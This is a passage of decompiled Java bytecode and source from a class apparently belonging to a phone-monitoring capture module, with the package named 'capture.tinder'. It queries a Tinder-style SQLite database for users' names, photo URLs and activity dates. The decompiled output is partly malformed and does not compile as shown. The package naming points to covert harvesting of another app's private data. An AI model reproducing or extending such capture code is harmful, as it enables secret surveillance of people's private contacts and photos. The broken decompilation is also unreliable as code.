    //   95: invokevirtual 342	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   98: pop
    //   99: aload 4
    //   101: ldc_w 690
    //   104: invokevirtual 342	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   107: pop
    //   108: aload 4
    //   110: ldc_w 782
    //   113: invokevirtual 342	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   116: pop
    //   117: aload 4
    //   119: ldc_w 784
    //   122: invokevirtual 342	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   125: pop
    //   126: aload 4
    //   128: ldc_w 774
    //   131: invokevirtual 342	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   134: pop
    //   135: aload 4
    //   137: ldc_w 786
    //   140: invokevirtual 342	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   143: pop
    //   144: aload 4
    //   146: ldc_w 788
    //   149: invokevirtual 342	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   152: pop
    //   153: aload 4
    //   155: ldc_w 778
    //   158: invokevirtual 342	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   161: pop
    //   162: aload 4
    //   164: ldc 111
    //   166: invokevirtual 342	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   169: pop
    //   170: aload 4
    //   172: ldc_w 780
    //   175: invokevirtual 342	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   178: pop
    //   179: aload 4
    //   181: ldc_w 790
    //   184: invokevirtual 342	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   187: pop
    //   188: ldc_w 792
    //   191: astore 5
    //   193: aload 4
    //   195: aload 5
    //   197: invokevirtual 342	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   200: pop
    //   201: aload 4
    //   203: invokevirtual 344	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   206: astore 4
    //   208: iconst_2
    //   209: istore 6
    //   211: iload 6
    //   213: anewarray 105	java/lang/String
    //   216: astore 5
    //   218: iconst_0
    //   219: istore 7
    //   221: aload 5
    //   223: iconst_0
    //   224: aload_1
    //   225: aastore
    //   226: iconst_1
    //   227: istore 7
    //   229: aload 5
    //   231: iload 7
    //   233: aload_1
    //   234: aastore
    //   235: aload_0
    //   236: aload 4
    //   238: aload 5
    //   240: invokevirtual 94	android/database/sqlite/SQLiteDatabase:rawQuery	(Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;
    //   243: astore 4
    //   245: aload 4
    //   247: ifnull +43 -> 290
    //   250: aload 4
    //   252: invokeinterface 97 1 0
    //   257: istore 6
    //   259: iload 6
    //   261: ifeq +29 -> 290
    //   264: ldc_w 711
    //   267: astore 5
    //   269: aload 4
    //   271: aload 5
    //   273: invokeinterface 77 2 0
    //   278: istore 6
    //   280: aload 4
    //   282: iload 6
    //   284: invokeinterface 80 2 0
    //   289: astore_2
    //   290: aload 4
    //   292: ifnull +10 -> 302
    //   295: aload 4
    //   297: invokeinterface 85 1 0
    //   302: getstatic 23	com/vvt/capture/tinder/removeFromPath:removeFromPath	Z
    //   305: istore_3
    //   306: iload_3
    //   307: ifeq +3 -> 310
    //   310: getstatic 23	com/vvt/capture/tinder/removeFromPath:removeFromPath	Z
    //   313: istore_3
    //   314: iload_3
    //   315: ifeq +3 -> 318
    //   318: aload_2
    //   319: areturn
    //   320: astore 4
    //   322: iconst_0
    //   323: istore_3
    //   324: aconst_null
    //   325: astore 4
    //   327: getstatic 28	com/vvt/capture/tinder/removeFromPath:MyUncaughtExceptionHandler	Z
    //   330: istore 6
    //   332: iload 6
    //   334: ifeq +3 -> 337
    //   337: aload 4
    //   339: ifnull -37 -> 302
    //   342: goto -47 -> 295
    //   345: astore 8
    //   347: iconst_0
    //   348: istore_3
    //   349: aconst_null
    //   350: astore 4
    //   352: aload 8
    //   354: astore_2
    //   355: aload 4
    //   357: ifnull +10 -> 367
    //   360: aload 4
    //   362: invokeinterface 85 1 0
    //   367: aload_2
    //   368: athrow
    //   369: astore_2
    //   370: goto -15 -> 355
    //   373: astore 5
    //   375: goto -48 -> 327
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	378	0	paramSQLiteDatabase	SQLiteDatabase
    //   0	378	1	paramString	String
    //   1	367	2	localObject1	Object
    //   369	1	2	localObject2	Object
    //   5	344	3	bool1	boolean
    //   13	283	4	localObject3	Object
    //   320	1	4	localException1	Exception
    //   325	36	4	localObject4	Object
    //   191	81	5	localObject5	Object
    //   373	1	5	localException2	Exception
    //   209	3	6	i	int
    //   257	3	6	bool2	boolean
    //   278	5	6	j	int
    //   330	3	6	bool3	boolean
    //   219	13	7	k	int
    //   345	8	8	localObject6	Object
    // Exception table:
    //   from	to	target	type
    //   211	216	320	java/lang/Exception
    //   224	226	320	java/lang/Exception
    //   233	235	320	java/lang/Exception
    //   238	243	320	java/lang/Exception
    //   211	216	345	finally
    //   224	226	345	finally
    //   233	235	345	finally
    //   238	243	345	finally
    //   250	257	369	finally
    //   271	278	369	finally
    //   282	289	369	finally
    //   327	330	369	finally
    //   250	257	373	java/lang/Exception
    //   271	278	373	java/lang/Exception
    //   282	289	373	java/lang/Exception
  }
  
  private static long d(String paramString)
  {
    Object localObject = Calendar.getInstance().getTimeZone();
    SimpleDateFormat localSimpleDateFormat = new java/text/SimpleDateFormat;
    localSimpleDateFormat.<init>("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'");
    TimeZone localTimeZone = TimeZone.getTimeZone("GMT");
    localSimpleDateFormat.setTimeZone(localTimeZone);
    long l = 0L;
    try
    {
      Date localDate = localSimpleDateFormat.parse(paramString);
      localSimpleDateFormat.setTimeZone((TimeZone)localObject);
      localObject = localSimpleDateFormat.format(localDate);
      localObject = localSimpleDateFormat.parse((String)localObject);
      l = ((Date)localObject).getTime();
    }
    catch (ParseException localParseException)
    {
      for (;;) {}
    }
    return l;
  }
  
  private static String d()
  {
    StringBuilder localStringBuilder = new java/lang/StringBuilder;
    localStringBuilder.<init>();
    localStringBuilder.append("SELECT ");
    localStringBuilder.append("image_url");
    localStringBuilder.append(", ");
    localStringBuilder.append("id");
    localStringBuilder.append(" FROM ");
    localStringBuilder.append("photos");
    localStringBuilder.append(" WHERE ");
    localStringBuilder.append("user_id");
    localStringBuilder.append(" = ? ");
    localStringBuilder.append(" AND ");
    localStringBuilder.append("photo_order");
    localStringBuilder.append(" = ? ");
    return localStringBuilder.toString();
  }
  
  private static String e()
  {
    Object localObject1 = "usersTable";
    String str = "photosTable";
    StringBuilder localStringBuilder = new java/lang/StringBuilder;
    localStringBuilder.<init>();
    localStringBuilder.append(" SELECT ");
    Object localObject2 = new java/lang/StringBuilder;
    ((StringBuilder)localObject2).<init>();
    localObject2 = (String)localObject1 + "." + "id";
    localStringBuilder.append((String)localObject2);
    localStringBuilder.append(" , ");
    localObject2 = new java/lang/StringBuilder;
    ((StringBuilder)localObject2).<init>();
    localObject2 = (String)localObject1 + "." + "first_name";
    localStringBuilder.append((String)localObject2);
    localStringBuilder.append(" , ");
    localObject2 = new java/lang/StringBuilder;
    ((StringBuilder)localObject2).<init>();
    localObject2 = str + "." + "image_url";
    localStringBuilder.append((String)localObject2);
    localStringBuilder.append(" FROM ");
    localStringBuilder.append("users");
    localObject2 = new java/lang/StringBuilder;
    ((StringBuilder)localObject2).<init>();
    localObject2 = " as " + (String)localObject1;
    localStringBuilder.append((String)localObject2);
    localStringBuilder.append(" LEFT JOIN ");
    localStringBuilder.append("photos");
    localObject2 = new java/lang/StringBuilder;
    ((StringBuilder)localObject2).<init>();
    localObject2 = " as " + str;
    localStringBuilder.append((String)localObject2);
    localStringBuilder.append(" ON ");
    localObject2 = new java/lang/StringBuilder;
    ((StringBuilder)localObject2).<init>();
    localObject1 = (String)localObject1 + "." + "id";
    localStringBuilder.append((String)localObject1);
    localStringBuilder.append(" = ");
    localObject1 = new java/lang/StringBuilder;
    ((StringBuilder)localObject1).<init>();
    localObject1 = str + "." + "user_id";
    localStringBuilder.append((String)localObject1);
    localStringBuilder.append(" WHERE ");
    localObject1 = new java/lang/StringBuilder;
    ((StringBuilder)localObject1).<init>();
    localObject1 = str + "." + "photo_order";
    localStringBuilder.append((String)localObject1);
    localStringBuilder.append(" = ? ");
    localStringBuilder.append(" ORDER BY ");
    localStringBuilder.append("last_activity_date");
    localStringBuilder.append(" DESC ");
    localStringBuilder.append(" LIMIT ? ");
    return localStringBuilder.toString();
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/tinder/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */